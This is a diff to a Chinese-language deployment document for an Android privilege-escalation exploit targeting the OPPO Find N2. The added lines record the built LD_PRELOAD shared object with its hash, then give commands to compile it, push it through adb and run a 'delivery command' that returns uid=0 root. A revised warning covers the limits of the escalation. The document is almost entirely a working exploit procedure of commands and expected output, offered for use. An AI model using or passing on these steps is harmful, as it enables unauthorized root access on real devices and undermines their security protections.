@@ -2,6 +2,8 @@
 
 # 环境搭建与部署文档
 
+> 状态（2026-10-05 冻结）：当前产物为 `preloadP.so`（构建自 `exploit-v29/build/oppo-find_n2/bin/preload.so`，sha256 `b5128c72…`，214,040 B）；零环境变量单条命令即可拿到真 root（uid=0）。
+
 ## 依赖清单
 
 | 依赖名称 | 版本要求 | 安装方式 | 是否必填 | 备注 |
@@ -65,6 +67,20 @@ adb shell getprop ro.build.display.id
 
 ### 编译 exploit
 
+当前树为 `exploit-v29/`,用 `build_v29.sh`(无 make 环境下的手写展开)构建:
+
+```bash
+# 进入 exploit-v29 目录并编译
+cd exploit-v29/
+bash ../build_v29.sh
+
+# 验证输出
+ls -la build/oppo-find_n2/bin/preload.so
+# 应显示 214,040 B (sha256 b5128c725216aad1464bc5c54e39bb2d980c2b3a474adc17278a4f9100acdb54)
+```
+
+历史(`exploit/` 子树,make 构建):
+
 ```bash
 # 进入 exploit 目录
 cd exploit/
@@ -77,32 +93,33 @@ make NDK=/usr/local/Caskroom/android-ndk/29/AndroidNDK14206865.app/Contents/NDK
 
 # 编译 (Linux)
 make NDK=/opt/android-ndk-r29
-
-# 验证输出
-ls -la out/aarch64/libexploit.so
-# 应显示约 128KB 的共享库
 ```
 
 ### 部署到设备
 
 ```bash
-# 推送到设备
-adb push out/aarch64/libexploit.so /data/local/tmp/preload.so
+# 推送到设备 (当前产物名为 preloadP.so)
+adb push exploit-v29/build/oppo-find_n2/bin/preload.so /data/local/tmp/preloadP.so
 
 # 设置权限
-adb shell chmod 755 /data/local/tmp/preload.so
+adb shell chmod 755 /data/local/tmp/preloadP.so
 
-# 验证文件
-adb shell ls -la /data/local/tmp/preload.so
+# 验证文件并核对 sha
+adb shell ls -la /data/local/tmp/preloadP.so
+adb shell sha256sum /data/local/tmp/preloadP.so
+# 期望: b5128c725216aad1464bc5c54e39bb2d980c2b3a474adc17278a4f9100acdb54  (214,040 B)
 ```
 
 ### 运行测试
 
 ```bash
-# 基础测试
-adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null' 2>&1
-
+# 基础冒烟测试(仅验证 so 能被加载)
+adb shell 'LD_PRELOAD=/data/local/tmp/preloadP.so /system/bin/ls /dev/null' 2>&1
 # 预期输出: "preload starting pid=..."
+
+# 交付命令(零环境变量单条命令,直接拿真 root)
+adb shell "LD_PRELOAD=/data/local/tmp/preloadP.so /system/bin/toybox id"
+# 预期输出: uid=0(root) gid=0(root) groups=0(root),… context=u:r:shell:s0
 ```
 
 ## 配置项全解
@@ -134,4 +151,4 @@ adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null' 2>&1
 > [!WARNING]
 > - 编译必须使用 `make clean && make`，Makefile 不追踪 .h 文件变化
 > - NDK 必须是 r29 版本，android35 会导致 shadow stack OOM
-> - 设备无 root，无法使用 strace、kallsyms、dmesg
+> - 设备无持久 root：提权为瞬时（worker `pause()` park），KernelSU 未 Live ⇒ 暂无 `su`；`/proc/kallsyms` 仍需 `CAP_SYSLOG`，`dmesg` 亦受限
